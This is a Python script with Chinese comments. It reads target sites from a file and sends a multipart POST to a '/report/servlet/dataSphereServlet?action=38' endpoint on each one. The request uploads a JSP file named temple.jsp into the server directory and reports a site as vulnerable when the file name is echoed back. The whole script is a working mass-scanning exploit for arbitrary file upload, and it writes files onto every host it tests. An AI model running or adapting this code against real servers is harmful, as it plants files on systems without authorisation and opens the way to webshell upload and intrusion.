import requests


def read_sites_from_file(filename):
    """从文件中读取站点列表"""
    try:
        with open(filename, 'r') as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(f"文件 '{filename}' 未找到。")
        return []


def format_url(url):
    """确保URL以http://或https://开头"""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url  # 默认使用http协议
    return url


def check_vulnerability(url):
    """检查站点是否存在漏洞"""
    formatted_url = format_url(url)
    test_url = formatted_url.rstrip('/') + '/report/servlet/dataSphereServlet?action=38'

    files = {
        'openGrpxFile': ('temple.jsp', '<% out.println("xiuxiu"); %>', 'text/plain'),
        'path': (None, './'),
        'saveServer': (None, '1')
    }

    headers = {
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'close'
    }

    try:
        # 发送 POST 请求
        response = requests.post(test_url, files=files, headers=headers, timeout=10)
        # 检查响应中是否包含特定字符串
        if 'temple.jsp' in response.text:
            print(f"漏洞存在: {url}")
        else:
            print(f"漏洞不存在: {url}")
    except requests.RequestException as e:
        print(f"请求 {test_url} 时出错: {e}")


def main():
    filename = 'site.txt'  # 要读取的文件名
    sites = read_sites_from_file(filename)

    for site in sites:
        check_vulnerability(site)


if __name__ == '__main__':
    main()